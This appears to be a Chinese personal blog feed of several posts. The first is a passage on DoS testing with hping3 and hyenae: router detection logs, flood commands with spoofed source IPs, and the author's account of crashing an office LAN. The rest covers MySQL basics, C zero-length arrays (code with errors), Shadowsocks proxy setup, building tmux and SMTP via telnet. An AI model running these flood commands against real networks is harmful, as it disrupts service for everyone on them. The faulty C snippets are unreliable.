<p>由于目的<code>MAC</code>随机，<strong>当MAC地址首字节为奇数时，生成的数据包为广播包</strong>，此时将产生广播风暴，局域网内的所有设备都将收到大量的广播包，当速率很高时，很容易导致局域网瘫痪，这是需要注意的。本人当时年少轻狂，有次测试，使用全速率的广播式<code>SYN/ACK</code>攻击，直接导致部门的局域网瘫痪断网，幸好是晚上，后来找人重置了部门内的网络设备才恢复，想想真是罪过啊。</p>
<h3 id="Use-cases"><a href="#Use-cases" class="headerlink" title="Use cases"></a>Use cases</h3><ul>
<li>Land Attack<ul>
<li>src:  %-172.17.14.94@53</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3118 *** {Land Attack} are suppressed!
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
</code></pre>
<ul>
<li>SYN/ACK scan (TCP SYN ACK)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3896 *** {SYN/ACK Scan} are suppressed!
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
</code></pre>
<ul>
<li>ping flood (icmp echo)<ul>
<li>src:  %-172.17.14.8</li>
<li>des: %-172.17.14.94</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 1881 *** {Ping Flood} are suppressed!
[DoS Attack: Ping Flood] from source: 172.17.14.8,
[DoS Attack: Ping Flood] from source: 172.17.14.8,
[DoS Attack: Ping Flood] from source: 172.17.14.8,
</code></pre>
<ul>
<li>ping sweep (icmp echo)<ul>
<li>src:  %-%</li>
<li>des: %-%</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 1719 *** {Ping Sweep} are suppressed!
[DoS Attack: Ping Sweep] from source: 188.167.1.1,
[DoS Attack: Ping Sweep] from source: 113.172.1.5,
[DoS Attack: Ping Sweep] from source: 175.181.2.6,
</code></pre>
<ul>
<li>RST Scan(TCP RST)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 4023 *** {RST Scan} are suppressed!
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
</code></pre>
<ul>
<li>ACK scan (TCP ACK)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3989 *** {ACK Scan} are suppressed!
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80
</code></pre>
<ul>
<li>FIN scan(TCP FIN)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3009 *** {FIN Scan} are suppressed!
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
</code></pre>
<h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><blockquote>
<p>hping3是用于生成和解析TCPIP协议数据包的开源工具</p>
</blockquote>
<p><code>hping3</code>同样可用于产生<code>ddos</code>攻击包，但与<code>hyenae</code>不同的是，<code>hping3</code>无法手动设置<code>MAC</code>地址，而是根据<code>IP</code>地址自动获取</p>
<p>需要注意的是，如果使用搬瓦工购买的<code>vps</code>向公网IP执行<code>hping3</code>攻击的话，最好不要尝试，如果要用也一定记得限速，否则就会被警告并关停,当然你有3次机会重置</p>
<p><img src="/assets/network/vps-warning.png" alt="vps warning"></p>
<h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><pre><code class="bash"># land attack
$ sudo hping3 -V -c 10000 -d 120 -S -w 64 --keep -p 80 -s 20000 --flood -a 172.17.14.52 172.17.14.52
# syn/ack attack
$ sudo hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 172.17.14.192 172.17.14.52

# -V verbose
# -c packet count
# -d data size
# -p destPort
# -s srcPort
# -a srcIP
# -S SYN tag
# -A ACK tag
# -w winsize
# -I interface
</code></pre>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><p>网络攻击工具</p>
<ul>
<li>hping3<ul>
<li><a href="http://man.linuxde.net/hping3" target="_blank" rel="noopener">http://man.linuxde.net/hping3</a></li>
<li><a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="noopener">http://0daysecurity.com/articles/hping3_examples.html</a></li>
</ul>
</li>
<li>LOIC</li>
<li>hyenae<ul>
<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
</ul>
</li>
<li>免费DDOS攻击测试工具大合集 <a href="http://www.freebuf.com/sectool/36545.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/36545.html</a></li>
</ul>
</li>
<li><p>ddos攻击说明</p>
<ul>
<li><a href="https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/" target="_blank" rel="noopener">https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/</a></li>
<li>网络攻击：半连接攻击(SYN攻击)、全连接攻击、RST攻击、IP欺骗、DNS欺骗、DOS/DDOS攻击 <a href="http://blog.csdn.net/guowenyan001/article/details/11777361" target="_blank" rel="noopener">http://blog.csdn.net/guowenyan001/article/details/11777361</a></li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Security </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ddos </tag>
            
            <tag> hping3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mySQL基本语法]]></title>
      <url>https://www.litreily.top/2018/02/08/mysql-basic/</url>
      <content type="html"><![CDATA[<p>最近折腾<code>vps</code>，想要手动搭建一个<code>LNMP</code>环境，那必然少不了要补补课，简单学习一下<code>mysql</code>的基本语法。</p>
<h2 id="install-mySQL"><a href="#install-mySQL" class="headerlink" title="install mySQL"></a>install mySQL</h2><h3 id="install-on-Centos"><a href="#install-on-Centos" class="headerlink" title="install on Centos"></a>install on Centos</h3><pre><code class="bash">$ sudo yum update
$ sudo yum install mysql-server mysql-client
$ sudo yum install mysql-devel # install sdk of mysql
# /usr/include/mysql/mysql.h
</code></pre>
<a id="more"></a>
<h3 id="install-on-Ubuntu"><a href="#install-on-Ubuntu" class="headerlink" title="install on Ubuntu"></a>install on Ubuntu</h3><pre><code class="bash">sudo apt-get update
sudo apt-get install mysql-server mysql-client
sudo apt-get install libmysqlclient15-dev || sudo apt-get install libmysqlclient-dev
</code></pre>
<h2 id="mySQL-cmd"><a href="#mySQL-cmd" class="headerlink" title="mySQL cmd"></a>mySQL cmd</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><pre><code class="bash">$ mysql -u USERNAME -p
$ mysql -u root -p
mysql&gt; \h
</code></pre>
<h3 id="add-user"><a href="#add-user" class="headerlink" title="add user"></a>add user</h3><pre><code class="bash">mysql&gt; CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;

# e.g.
mysql&gt; CREATE USER &#39;test&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;
</code></pre>
<h3 id="set-password"><a href="#set-password" class="headerlink" title="set password"></a>set password</h3><pre><code class="bash"># 为当前用户设置新的密码
mysql&gt; SET PASSWORD = PASSWORD(&quot;newpassword&quot;);

# 为其它用户重设密码
mysql&gt; SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
</code></pre>
<h3 id="delete-user"><a href="#delete-user" class="headerlink" title="delete user"></a>delete user</h3><pre><code class="bash">DROP USER &#39;username&#39;@&#39;host&#39;
</code></pre>
<h3 id="grant-privileges"><a href="#grant-privileges" class="headerlink" title="grant privileges"></a>grant privileges</h3><pre><code class="bash"># 为用户授权
# privileges: SELECT, INSERT, UPDATE, ALL, ...
mysql&gt; GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39;;
# 刷新缓存，使授权生效
mysql&gt; FLUSH PRIVILEGES;

# e.g.
mysql&gt; GRANT SELECT, INSERT ON test.user TO &#39;pig&#39;@&#39;%&#39;;
mysql&gt; GRANT ALL ON *.* TO &#39;pig&#39;@&#39;%&#39;;
</code></pre>
<h3 id="databases-and-tables"><a href="#databases-and-tables" class="headerlink" title="databases and tables"></a>databases and tables</h3><ul>
<li>create database or table</li>
</ul>
<pre><code class="bash"># create database: vps
mysql&gt; CREATE DATABASE vps;
Query OK, 1 row affected (0.00 sec)

# show databases
mysql&gt; SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| vps                |
+--------------------+
5 rows in set (0.00 sec)

# use database
mysql&gt; USE vps;

# create table
mysql&gt; CREATE TABLE test_tbl(
    -&gt; test_id INT NOT NULL AUTO_INCREMENT,
    -&gt; test_title VARCHAR(100) NOT NULL,
    -&gt; test_author VARCHAR(40) NOT NULL,
    -&gt; test_date DATE,
    -&gt; PRIMARY KEY ( test_id )
    -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;
Query OK, 0 rows affected (0.06 sec)

# show tables
mysql&gt; SHOW TABLES;
+---------------+
| Tables_in_vps |
+---------------+
| test_tbl      |
+---------------+
1 row in set (0.00 sec)

# describe table
mysql&gt; DESC test_tbl;
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| test_id     | int(11)      | NO   | PRI | NULL    | auto_increment |
| test_title  | varchar(100) | NO   |     | NULL    |                |
| test_author | varchar(40)  | NO   |     | NULL    |                |
| test_date   | date         | YES  |     | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
4 rows in set (0.03 sec)

# drop table
mysql&gt; DROP TABLE runoob_tbl;
Query OK, 0 rows affected (0.01 sec)
</code></pre>
<p>in conclusion</p>
<pre><code class="bash">mysql&gt; CREATE DATABESE dataBaseName;
mysql&gt; SHOW DATABASES;
mysql&gt; USE dataBaseName;
mysql&gt; CREATE TABLE tableName(content);
mysql&gt; SHOW TABLES;
mysql&gt; DESC tableName;
mysql&gt; DROP tableName;
</code></pre>
<ul>
<li>handle tables</li>
</ul>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><a href="http://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-tutorial.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> centos </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[结构体中长度为0的字符数组]]></title>
      <url>https://www.litreily.top/2018/01/02/len0-charArray/</url>
      <content type="html"><![CDATA[<p>在C语言的结构体中，有一种特殊用法，在结构体的末尾放置一个长度为0的字符数组，结构体倒数第二个位置放置一个整型变量<code>len</code>。其典型样例如下：</p>
<pre><code class="c">typedef struct dynamic_value {
  int flag;
  int len;
  char val[0];
}s_flv;
</code></pre>
<p>本文针对其特征，用法及适用场合予以简单介绍。</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul>
<li>最后的字符数组<code>val</code>长度为0，不占用额外的内存空间</li>
<li>倒数第二个元素为一整型变量，用于存储字符数组的真实长度</li>
<li><code>val</code>实际指向的是结构体<code>s_flv</code>之后的内存空间</li>
<li>字符数组的大小可以在定义结构体变量时动态指定<code>s_flv.len</code></li>
<li>结构体元素个数不限，样例为典型模式，其中的<code>flag</code>作为标签用以标识不同的数据</li>
</ul>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul>
<li>按<code>s_flv</code>格式写入数据到文件</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;

static void write_flv(FILE *fp, int flag, char *val)
{
    int len = 0;
    if(val == NULL)
        val = &quot;&quot;;
    else
        len = strlen(val);

    fwrite(&amp;flag, sizeof(flag), 1, fp); // 写入标识
    fwrite(&amp;len, sizeof(len), 1, fp);   // 写入字符数组长度
    fwrite(val, len, 1, fp);    // 写入长度为len的字符串
}
</code></pre>
<ul>
<li>读取文件</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;

static int read_flv(char *file, char *val)
{
    char buf[32];   // 假定字符数组长度小等于32
    char *p = buf;

    FILE *fp = fopen(file, &quot;r&quot;);
    if(!fp)
        return -1;

    if(fread(buf, 2*sizeof(int), 1, fp) &lt;= 0)   // 读取前两个整型数据，获取字符数组长度
        return -1;

    s_flv *flv = (s_flv *)p;        // 定义s_flv结构体，存储数据
    fread(val, flv-&gt;len, 1, fp);    // 读取字符数组
    flose(fp);
    return 0;
}
</code></pre>
<ul>
<li><strong>说明</strong><ul>
<li>每执行一次<code>fread</code>或<code>fwrite</code>函数，文件指针就往后偏移相应的读取长度或写入长度</li>
<li><code>read_flv</code>定义<code>flv</code>时，从<code>buf</code>中可以获取到数组长度，然后使用<code>fread</code>读取相应长度的数据即可取出字符数组的内容。</li>
<li>使用以上方法生成的文件内容是二进制文件，许多字符是不可打印字符，所以使用<code>cat</code>指令无法正常显示文件内容</li>
</ul>
</li>
</ul>
<p>上面描述的方法是将<code>s_flv</code>类型的数据存入文件，但如果不想存入文件，那么该如何为其分配内存呢，下面来看一下：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// 定义s_flv指针变量
int size = 10;
s_flv *flv = (s_flv *)malloc(sizeof(s_flv) + size);
flv-&gt;len = size;
flv-&gt;val = flv + sizeof(s_flv);

// 释放指针
free(flv);
</code></pre>
<h2 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h2><ul>
<li><code>json</code>文件的读写</li>
<li>不定长度字符串的读写</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://www.cnblogs.com/felove2013/articles/4050226.html" target="_blank" rel="noopener">浅析长度为0的数组</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VPS+SS翻越GFW]]></title>
      <url>https://www.litreily.top/2017/09/07/ss-config/</url>
      <content type="html"><![CDATA[<h2 id="购买并配置VPS"><a href="#购买并配置VPS" class="headerlink" title="购买并配置VPS"></a>购买并配置VPS</h2><p>在<a href="http://banwagong.cn/" target="_blank" rel="noopener">搬瓦工</a>选择一个<code>VPS</code>，大概每年<code>$19.99</code>，使用邀请码可优惠<code>6%</code>，可以使用支付宝(Alipay)购买。成功购买<code>VPS</code>后，进入<code>VPS</code>的<a href="https://kiwivm.64clouds.com/main.php" target="_blank" rel="noopener">管理界面</a>，登录账户后便可以查看服务器信息，并进行相关配置了。</p>
<h2 id="安装SS服务器"><a href="#安装SS服务器" class="headerlink" title="安装SS服务器"></a>安装SS服务器</h2><p>如果VPS选用<code>centos</code>系统，则可以直接在配置界面左下方选择<code>Shadowsocks Server</code>，一键安装就<code>ok</code>了，当然喜欢折腾的也可以自己用<code>yum install</code>下载安装和配置<code>Shadowsocks</code>，此不赘述。</p>
<h2 id="安装SS客户端"><a href="#安装SS客户端" class="headerlink" title="安装SS客户端"></a>安装SS客户端</h2><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p><code>Ubuntu</code>可以选择<code>github</code>中的<a href="https://github.com/shadowsocks/shadowsocks" target="_blank" rel="noopener">shadowsocks/shadowsocks</a>，或<a href="https://github.com/shadowsocks/shadowsocks-qt5" target="_blank" rel="noopener">shadowsocks/shadowsocks-qt5</a>.</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>Windows</code>选择<a href="https://github.com/shadowsocks/shadowsocks-windows" target="_blank" rel="noopener">shadowsocks/shadowsocks-windows</a>，或<code>shadowsocks/shadowsocks-qt5</code>中的<a href="https://github.com/shadowsocks/shadowsocks-qt5/releases" target="_blank" rel="noopener">ss-qt5-v2.9.0-win64.7z</a>。本人刚开始使用前者，无法科学上网，从<code>log</code>信息中发现可以将数据发送至<code>VPS</code>，但<code>VPS</code>无法解析其头部信息，故而连接失败，后来尝试网上各种方法无果，最终使用<code>qt5</code>版本成功。具体原因不详。</p>
<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>安卓端就下载安装<a href="https://github.com/shadowsocks/shadowsocks-android/releases" target="_blank" rel="noopener">shadowsocks/shadowsocks-android</a>内的<code>apk</code>即可。</p>
<h2 id="配置SS客户端"><a href="#配置SS客户端" class="headerlink" title="配置SS客户端"></a>配置SS客户端</h2><p><code>SS</code>的配置相当简单，参考<code>VPS</code>中<code>Shadowsocks</code>配置界面给的信息即可，必要信息包括：</p>
<ul>
<li>服务器地址 (<code>Host IP</code>)</li>
<li>密码(<code>password</code>)  </li>
<li>端口号<code>Port(default:443)</code></li>
<li>加密方式<code>encryption(default:aes-256-cfb)</code></li>
</ul>
<h2 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h2><p>无论是<code>google chrome</code>还是<code>firefox</code>，都有相应的代理插件，最常用的是<code>SwitchyOmega</code>。下载该插件并安装后，需要打开插件的<strong>选项</strong>，进行一定的配置操作：</p>
<ol>
<li>新建<strong>情景模式</strong>（<code>profile</code>），命名随意，如：<strong>SS</strong>;</li>
<li>在默认(<code>default</code>)选项中选择<code>SOCK5</code>，服务器(<code>Server</code>)设为<code>127.0.0.1</code>，端口(<code>port</code>)设为<code>1080</code>;</li>
<li>点击左侧的应用修改(<code>Apply changes</code>);</li>
<li>点击<code>auto switch</code>，页面上的条件栏(<code>condition</code>)不用管，点击下面的添加规则，在情景模式（<code>profile</code>）一列中选择之前创建的<code>SS</code>，默认选项分两种情况：<ul>
<li>普通网络，没有额外代理的情况，默认设为直连(<code>direct</code>);</li>
<li>如果是公司网设了代理，则默认设为代理<code>proxy</code>，并在代理<code>proxy</code>中设置好公司的代理服务器<code>IP</code>和端口号<code>port</code>.</li>
</ul>
</li>
<li>在下面的规则列表配置中，选择<code>AutoProxy</code>,添加网址<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a>， 然后点击下方按钮更新列表信息，网址无误的话会提示成功更新规则列表；</li>
<li>点击左侧应用修改<code>Apply changes</code>，在插件中选择<code>auto switch</code>选项即可开启自动切换代理模式。</li>
</ol>
<p>经过以上配置后，启动已配置好服务器信息的<code>Shadowsocks</code>客户端，正常情况下就可以访问<code>Google</code>, <code>youtube</code>等国外网站了。</p>
<h2 id="配置全局代理"><a href="#配置全局代理" class="headerlink" title="配置全局代理"></a>配置全局代理</h2><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><p>在<code>Ubuntu</code>中，可以打开 Settings-&gt;Network-&gt;Network Proxy ，在<code>Socks Host</code>一栏中设置<code>IP</code>为<code>127.0.0.1</code>，代理端口为<code>1080</code>。这样便设置好了全局代理。<code>firefox</code>的网络设置选项中有单独一项用于选择系统代理设置，对应的就是这个。</p>
<h3 id="安装polipo"><a href="#安装polipo" class="headerlink" title="安装polipo"></a>安装polipo</h3><p><code>polipo</code>是一个小型的代理服务器软件，用于二次转发数据包，使用它可以配合系统设置里的全局代理实现真正的全局代理，让终端等应用都可以翻越<code>GFW</code>，这样在<code>shell</code>中下载软件就方便快速多了，亲测效果很是明显。</p>
<p>下面是安装配置步骤：</p>
<pre><code class="bash">$ sudo apt-get install polipo
$ sudo vim /etc/polipo/config
# This file only needs to list configuration variables that deviate
# from the default values.  See /usr/share/doc/polipo/examples/config.sample
# and &quot;polipo -v&quot; for variables you can tweak and further information.
logSyslog = true
logFile = /var/log/polipo/polipo.log
proxyAddress = &quot;0.0.0.0&quot;
socksParentProxy = &quot;127.0.0.1:1080&quot;
socksProxyType = socks5
chunkHighMark = 50331648
objectHighMark = 16384
serverMaxSlots = 64
serverSlots = 16
serverSlots1 = 32
</code></pre>
<p>修改<code>config</code>文件后需要重启一下<code>polipo</code>，然后测试是否代理是否成功开启。</p>
<pre><code class="bash">$ sudo /etc/init.d/polipo restart
$ export http_proxy=&quot;http://127.0.0.1:8123/&quot; curl ifconfig.me
***.***.***.*** # return your VPS-IP_ADDR if success
</code></pre>
<p>到此就可以愉快的使用谷歌了，但是目前晚上的网速略慢，看<code>youtube</code>经常只能到<code>360P</code>。</p>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[远程服务器中编译安装tmux]]></title>
      <url>https://www.litreily.top/2017/08/23/tmux-install/</url>
      <content type="html"><![CDATA[<p>在工作当中，公司出于安全考虑，部署的远程Linux服务器总有一些限制（没网，Shell指令有限），而且员工作为普通用户，无法安装软件到除用户目录以外的目录。当我们需要下载安装一些常用工具时，因为没网，所以无法使用<code>apt-get</code>等下载指令，只能先在本地PC下载软件源码，然后传入服务器进行编译安装。本文以<code>tmux</code>为例说明服务器中编译安装软件的流程。</p>
<p>安装路径：<code>~/lib/software/tmux</code></p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><code>tmux</code>的下载地址 : <a href="https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz" target="_blank" rel="noopener">https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz</a></p>
<p>依赖库<code>libevent</code>：<a href="https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz" target="_blank" rel="noopener">https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz</a></p>
<p>下载后的文件通过一定方式(scp，共享服务，...)可以传入服务器中。</p>
<h2 id="Move-files-optional"><a href="#Move-files-optional" class="headerlink" title="Move files (optional)"></a>Move files (optional)</h2><p>在服务器中执行以下指令，将文件放入<code>~/lib</code>文件夹。</p>
<pre><code class="bash">cd
mkdir lib
cp sharedir.git/*.tar.gz lib/
</code></pre>
<h2 id="Edit-profile"><a href="#Edit-profile" class="headerlink" title="Edit .profile"></a>Edit .profile</h2><p>编辑<code>.profile</code>，添加全局变量<code>SWDIR</code>（存放用户手动编译安装的软件）；更新依赖库<code>LD_LIBRARY_PATH</code>和环境变量<code>PATH</code>，分别添加<code>tmux</code>的依赖路径和安装路径。</p>
<pre><code class="bash">$ vim ~/.profile
# ...
export SWDIR=/home/&lt;username&gt;/lib/software
export LD_LIBRARY_PATH=$LD_LIBRARY:$SWDIR/libevent/lib

PATH=$PATH:${SWDIR}/tmux/:${SWDIR}/tmux/bin/
</code></pre>
<h2 id="Complie-libevent"><a href="#Complie-libevent" class="headerlink" title="Complie libevent"></a>Complie libevent</h2><p>配置好环境变量后，首先编译<code>tmux</code>的依赖库<code>libevent</code></p>
<pre><code class="bash">cd ~/lib
tar -xvzf libevent-2.1.8-stable.tar.gz
cd libevent-2.1.8-stable
./autogen.sh
./configure --prefix=$SWDIR/libevent &amp;&amp; make
make install
</code></pre>
<p><strong>说明：</strong>默认安装路径是没有访问权限的，所以需要使用<code>--prefix</code>选项手动指定安装路径至用户目录中的某个文件夹。</p>
<h2 id="Complie-tmux"><a href="#Complie-tmux" class="headerlink" title="Complie tmux"></a>Complie tmux</h2><pre><code class="bash">cd ~/lib
tar -xvzf tmux-2.5.tar.gz
cd tmux-2.5
./configure --prefix=$SWDIR/tmux CFLAGS=&quot;-I$SWDIR/libevent/include&quot; LDFLAGS=&quot;-L$SWDIR/libevent/lib&quot; &amp;&amp; make
make install
</code></pre>
<p><strong>说明：</strong><code>CFLAGS</code>和<code>LDFLAGS</code>用于指定编译<code>tmux</code>所需的依赖库文件。</p>
<p>至此，<code>tmux</code>便安装完成了。在<code>shell</code>中输入<code>tmux</code>即可启动，通过<code>man tmux</code>可以查看帮助文档。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Telnet中使用smtp发送邮件]]></title>
      <url>https://www.litreily.top/2017/08/17/telnet-smtp/</url>
      <content type="html"><![CDATA[<p><code>Telnet</code>是远程登录服务的标准协议和主要方式，工作于<code>TCP/IP</code>协议族的应用层，常用于远程登录<code>web</code>服务器，其中便包括<code>SMTP</code>，<code>POP3</code>等邮件服务器。</p>
<p>这几天参考书籍《计算机网络-自顶向下方法》学习计算机网络知识，顺便尝试了如何使用<code>Telnet</code>登录<code>smtp</code>发送邮件，下面通过一个简单示例介绍具体的发送过程。</p>
<h2 id="Telnet-smtp-163-com-25"><a href="#Telnet-smtp-163-com-25" class="headerlink" title="Telnet smtp.163.com 25"></a>Telnet smtp.163.com 25</h2><p><code>smtp</code>对应的端口号为<code>25</code>，以163邮箱为例，下面是邮件发送过程。</p>
<pre><code class="zsh">→ ~ telnet smtp.163.com 25
Trying 220.181.12.15...
Connected to smtp.163.com.
Escape character is ^].
220 163.com Anti-spam GT for Coremail System (163com[20141201])
helo 163.com
250 OK
auth login
334 dXNlcm5hbWU6
MTgyNjY2MzI4NzJAMTYzLmNvbQ==
334 UGFzc3dvcmQ6
****************
235 Authentication successful
mail from:&lt;182****2872@163.com&gt;
250 Mail OK
rcpt to:&lt;707***098@qq.com&gt;
250 Mail OK
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
From: 182****2872@163.com
To: 707***098@qq.com
Subject: Test the use of smtp

  Hello, litreily.
  This is a message edit with telnet.

Best wish to you.
Litreily
.
250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693
quit
Connection closed by foreign host.
→ ~
</code></pre>
<p>下面分开对每个过程进行解析，<code>C</code>代表客户端，即本机，<code>S</code>代表远程服务器端。整个过程分为以下几步：</p>
<ul>
<li>打招呼</li>
<li>账户认证</li>
<li>声明邮箱地址</li>
<li>书写邮件内容</li>
<li>退出<code>Telnet</code></li>
</ul>
<h3 id="招呼语"><a href="#招呼语" class="headerlink" title="招呼语"></a>招呼语</h3><pre><code class="bash">S 220 163.com Anti-spam GT for Coremail System (163com[20141201])
C helo 163.com
S 250 OK
</code></pre>
<p><code>220</code>代表服务器已准备好，客户端首先向服务器打一声招呼<code>helo</code>，服务器接收到后返回一个<code>250</code>应答信号，代表打招呼成功，下面可以进行账户的密码认证。</p>
<h3 id="账户认证"><a href="#账户认证" class="headerlink" title="账户认证"></a>账户认证</h3><pre><code class="bash">C auth login
S 334 dXNlcm5hbWU6
C MTgyNjY2MzI4NzJAMTYzLmNvbQ==
S 334 UGFzc3dvcmQ6
C ****************
S 235 Authentication successful
</code></pre>
<p>客户端发送<code>auth login</code>声明自己将进行邮箱账户的用户名认证和密码认证。服务器端返回一个以<code>334</code>代码开头的提示信息，不必追究其语义，而后用户依次输入通过<code>Base64</code>加密的邮箱名和密码，加密网址见后续参考资料。当输入的账号密码无误时，服务端将返回认证成功的提示语。</p>
<h3 id="声明邮箱地址"><a href="#声明邮箱地址" class="headerlink" title="声明邮箱地址"></a>声明邮箱地址</h3><pre><code class="bash">C mail from:&lt;182****2872@163.com&gt;
S 250 Mail OK
C rcpt to:&lt;707***098@qq.com&gt;
S 250 Mail OK
</code></pre>
<p>账户密码认证结束后，客户端通过<code>mail from:&lt;emailName&gt;</code>以及<code>rcpt to:&lt;nameEmail&gt;</code>声明邮箱的源地址和目的地址。</p>
<h3 id="书写邮件内容"><a href="#书写邮件内容" class="headerlink" title="书写邮件内容"></a>书写邮件内容</h3><pre><code class="bash">C data
S 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
C From: 182****2872@163.com
C To: 707***098@qq.com
C Subject: Test the use of smtp
C
C   Hello, litreily.
C   This is a message edit with telnet.
C
C Best wish to you.
C Litreily
C .
S 250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693
</code></pre>
<p>写明邮件地址后，使用指令<code>data</code>进入邮件编辑状态，服务器端会提示当输入<code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code>时退出编辑状态。</p>
<p>邮件内容有一定的格式要求，不按要求随意书写有可能被当成垃圾邮件或不合法邮件而退信。通常需要指定邮件主题<code>Subject</code>，其它相关信息包括时间<code>Date</code>，邮件地址<code>From</code>，<code>To</code>等，然后再书写邮件主体内容，更详细的格式可以参考文档<strong>【RFC 821】</strong>。编辑结束后，以单行的点号<code>.</code>结束。如果一切正常，服务器端将返回以<code>250</code>开头的应答信息，并提示邮件以进入<code>smtp</code>的发送队列。此时便可以查收邮件予以验证了。</p>
